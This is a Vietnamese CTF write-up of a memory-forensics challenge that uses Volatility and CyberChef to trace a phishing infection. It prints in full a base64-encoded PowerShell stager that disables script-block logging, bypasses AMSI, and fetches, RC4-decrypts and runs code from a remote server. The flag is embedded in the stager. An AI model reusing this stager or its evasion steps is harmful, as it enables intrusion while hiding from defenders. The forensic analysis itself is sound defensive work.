# Reminiscent
## CHALLENGE DESCRIPTION
Suspicious traffic was detected from a recruiter&#039;s virtual PC. A memory dump of the offending VM was captured before it was removed from the network for imaging and analysis. Our recruiter mentioned he received an email from someone regarding their resume. A copy of the email was recovered and is provided for reference. Find and decode the source of the malware to find the flag.

## Tools use
- volatility
- Cyberchef 

# Analysis
Giải nén file ta được 3 file:
```
.
├── documents
│   ├── flounder-pc.memdump.elf
│   ├── imageinfo.txt
│   └── Resume.eml
```
## Resume.eml
Từ thông tin đọc được thì user đã tải file resume.zip và có thể đây là nguyên nhân khiến máy dính mal. 

## imageinfo.txt
```
   Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027fe0a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027ffd00L
                KPCR for CPU 1 : 0xfffff880009eb000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2017-10-04 18:07:30 UTC+0000
     Image local date and time : 2017-10-04 11:07:30 -0700
```
Thông tin từ máy này cho biết profile là Win7SP1x64 một thông tin hữu ích để load profile cho volatility

## flounder-pc.memdump.elf
Đầu tiên thì kiểm tra xem có kết nối nào ra bên ngoài không 

```
$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.netscan
Volatility 3 Framework 1.0.0
Progress:  100.00               PDB scanning finished
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0x1e069840      UDPv4   10.10.100.43    137     *       0               4       System  2017-10-04 18:04:31.000000
0x1e06a950      TCPv4   10.10.100.43    139     0.0.0.0 0       LISTENING       4       System  -
0x1e078670      TCPv4   0.0.0.0 5357    0.0.0.0 0       LISTENING       4       System  -
0x1e078670      TCPv6   ::      5357    ::      0       LISTENING       4       System  -
0x1e0a8ec0      UDPv4   0.0.0.0 60655   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000
0x1e0a8ec0      UDPv6   ::      60655   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000
0x1e0ac8a0      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       476     services.exe    -
0x1e0b0a50      UDPv4   0.0.0.0 60654   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000
0x1e0e08a0      TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  -
0x1e0e08a0      TCPv6   ::      445     ::      0       LISTENING       4       System  -
0x1e0f9010      UDPv4   0.0.0.0 5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e243b20      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       900     svchost.exe     -
0x1e27f980      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       900     svchost.exe     -
0x1e27f980      TCPv6   ::      49154   ::      0       LISTENING       900     svchost.exe     -
0x1e28f1a0      UDPv4   0.0.0.0 5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e28f1a0      UDPv6   ::      5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e2ec510      TCPv6   -       0       382b:ff01:80fa:ffff:a010:4502:80fa:ffff 0       CLOSED  384     svchost.exe     N/A
0x1e2f33f0      TCPv4   0.0.0.0 49157   0.0.0.0 0       LISTENING       492     lsass.exe       -
0x1e2fc460      UDPv4   127.0.0.1       54573   *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e391b30      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       476     services.exe    -
0x1e391b30      TCPv6   ::      49155   ::      0       LISTENING       476     services.exe    -
0x1e3c5da0      UDPv4   0.0.0.0 5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e3f7010      UDPv4   0.0.0.0 5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000
0x1e3f7010      UDPv6   ::      5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000
0x1e3fb010      UDPv4   0.0.0.0 0       *       0               384     svchost.exe     2017-10-04 18:04:33.000000
0x1e3fb010      UDPv6   ::      0       *       0               384     svchost.exe     2017-10-04 18:04:33.000000
0x1e47a730      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  -
0x1e4c1e60      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       728     svchost.exe     -
0x1e4c30a0      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       728     svchost.exe     -
0x1e4c30a0      TCPv6   ::      135     ::      0       LISTENING       728     svchost.exe     -
0x1e4d7e70      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       376     wininit.exe     -
0x1e4d7e70      TCPv6   ::      49152   ::      0       LISTENING       376     wininit.exe     -
0x1e517800      TCPv6   -       0       38cb:1702:80fa:ffff:38cb:1702:80fa:ffff 0       CLOSED  2248    wmpnetwk.exe    N/A
0x1e556820      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       792     svchost.exe     -
0x1e556820      TCPv6   ::      49153   ::      0       LISTENING       792     svchost.exe     -
0x1e5689e0      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       792     svchost.exe     -
0x1e5a3250      UDPv4   0.0.0.0 5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000
0x1e5cdef0      TCPv4   0.0.0.0 49157   0.0.0.0 0       LISTENING       492     lsass.exe       -
0x1e5cdef0      TCPv6   ::      49157   ::      0       LISTENING       492     lsass.exe       -
0x1e5fa480      UDPv4   127.0.0.1       1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e774a60      UDPv4   10.10.100.43    138     *       0               4       System  2017-10-04 18:04:31.000000
0x1e7d7a60      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  N/A
0x1e85e010      UDPv6   ::1     1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e8fb010      UDPv4   0.0.0.0 5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e8fb010      UDPv6   ::      5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e8ff010      UDPv4   10.10.100.43    1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e903b10      UDPv6   ::1     54572   *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1e909010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1ec304b0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1ed592b0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1ee7cd20      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       376     wininit.exe     -
0x1eec14e0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1eec14e0      UDPv6   ::      3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1f1ea4f0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1f1ea4f0      UDPv6   ::      3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000
0x1f6c1010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1f6c1010      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1f6c2ec0      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1fc04010      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  N/A
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc15010      TCPv6   ::1     2869    ::1     49237   ESTABLISHED     4       System  N/A
0x1fc3d320      TCPv4   10.10.100.43    49247   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc769d0      TCPv4   127.0.0.1       49232   127.0.0.1       49231   ESTABLISHED     2812    thunderbird.ex  N/A
0x1fc76cf0      TCPv4   127.0.0.1       49231   127.0.0.1       49232   ESTABLISHED     2812    thunderbird.ex  N/A
0x1fc85010      UDPv6   fe80::6cee:b5c1:4a75:f04b       1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000
0x1fc8e680      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1fc8e680      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000
0x1fc99db0      TCPv4   0.0.0.0 554     0.0.0.0 0       LISTENING       2248    wmpnetwk.exe    -
0x1fcc2b80      TCPv4   0.0.0.0 2869    0.0.0.0 0       LISTENING       4       System  -
0x1fcc2b80      TCPv6   ::      2869    ::      0       LISTENING       4       System  -
0x1fcc8010      TCPv6   ::1     49237   ::1     2869    ESTABLISHED     2248    wmpnetwk.exe    N/A
0x1fcdbec0      UDPv4   0.0.0.0 0       *       0               664     VBoxService.ex  2017-10-04 18:06:56.000000
0x1fcf4940      TCPv4   10.10.100.43    49233   10.10.20.166    143     ESTABLISHED     2812    thunderbird.ex  N/A
0x1fd01780      TCPv4   0.0.0.0 10243   0.0.0.0 0       LISTENING       4       System  -
0x1fd01780      TCPv6   ::      10243   ::      0       LISTENING       4       System  -
0x1fd9a3e0      TCPv4   0.0.0.0 554     0.0.0.0 0       LISTENING       2248    wmpnetwk.exe    -
0x1fd9a3e0      TCPv6   ::      554     ::      0       LISTENING       2248    wmpnetwk.exe    -
0x1fdb3630      TCPv4   10.10.100.43    49236   10.10.20.166    143     ESTABLISHED     2812    thunderbird.ex  N/A
```

Ở đây có process của `powershell.exe` lại kết nối ra bên ngoài

```
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc3d320      TCPv4   10.10.100.43    49247   10.10.99.55     80      CLOSED  2752    powershell.exe  -
```
Điều bất thường ở đây chính là `powershell.exe` đã từng kết nối tới port `80` một trong những port liên quan đến giao thức HTTP. Rất có thể đây là giấu kết nối đến **C2 server**

Kiểm chứng điều này, ta sẽ dùng plug `cmdline` để xem command của lệnh ps này là gì

```
$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline --pid 2752                                                                                                                                            2 ⨯
Volatility 3 Framework 1.0.0
Progress:  100.00               PDB scanning finished
PID     Process Args

2752    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

## Cyberchef
Ném đoạn bị mã encode trên và lấy được flag.

![image](https://hackmd.io/_uploads/By2AxV12ye.png)

